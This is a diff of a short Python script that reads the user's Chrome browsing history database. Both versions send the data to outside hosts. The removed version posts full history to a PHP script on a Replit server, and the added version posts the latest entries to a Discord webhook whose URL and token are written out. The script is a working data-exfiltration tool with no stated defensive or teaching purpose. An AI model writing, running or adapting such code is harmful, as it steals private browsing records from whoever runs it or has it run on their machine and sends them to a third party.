@@ -1,40 +1,39 @@
 import sqlite3
-import os
-import datetime
-import json
 import requests
+import json
 
-# Get the path to the user's Chrome history database
-data_path = os.path.expanduser('~') + "/Library/Application Support/Google/Chrome/Default"
-files = os.listdir(data_path)
-history_db = os.path.join(data_path, 'History')
-
-# Establish a connection to the Chrome history database
-connection = sqlite3.connect(history_db)
+# Connect to the Chrome history database
+connection = sqlite3.connect('/Users/yourusername/Library/Application Support/Google/Chrome/Default/History')
 cursor = connection.cursor()
 
-# Retrieve the URL, title, and visit time for each history item
-select_statement = "SELECT urls.url, urls.title, visits.visit_time FROM urls, visits WHERE urls.id = visits.url;"
+# Execute a SELECT statement to retrieve the browsing history
+select_statement = "SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10"
 cursor.execute(select_statement)
 results = cursor.fetchall()
 
-# Create a list of dictionaries representing each history item
-history_items = []
+# Format the history data as a list of dictionaries
+history = []
 for row in results:
-    url = row[0]
-    title = row[1]
-    timestamp = row[2] / 1000000
-    visit_time = datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
-    history_items.append({"url": url, "title": title, "visit_time": visit_time})
+    title, url, timestamp = row
+    history.append({
+        'title': title,
+        'url': url,
+        'timestamp': timestamp
+    })
 
-# Close the database connection
-connection.close()
+# Convert the history data to a JSON payload
+payload = {
+    'content': 'Here is the latest browsing history:',
+    'embeds': [
+        {
+            'title': 'Latest Chrome History',
+            'description': json.dumps(history, indent=2)
+        }
+    ]
+}
 
-# Send the history data to a PHP script on a Replit server
-server_url = "https://vapidplayfuldatamart.dopebope.repl.co/index.php"
-payload = {"history": json.dumps(history_items)}
-response = requests.post(server_url, data=payload)
-if response.status_code == 200:
-    print("History data sent to Replit server successfully.")
-else:
-    print(f"Failed to send history data to Replit server. Response code: {response.status_code}")
+# Send the payload to the Discord webhook
+response = requests.post('https://discord.com/api/webhooks/1089245450760097995/1sH24u4b4epfXkh3goi45cH4CFOhoz6bvkHROD5y75gcHYkmg3madp9FcQyY7FHGEhHx', json=payload)
+
+# Print the response from the webhook server
+print(response.content)
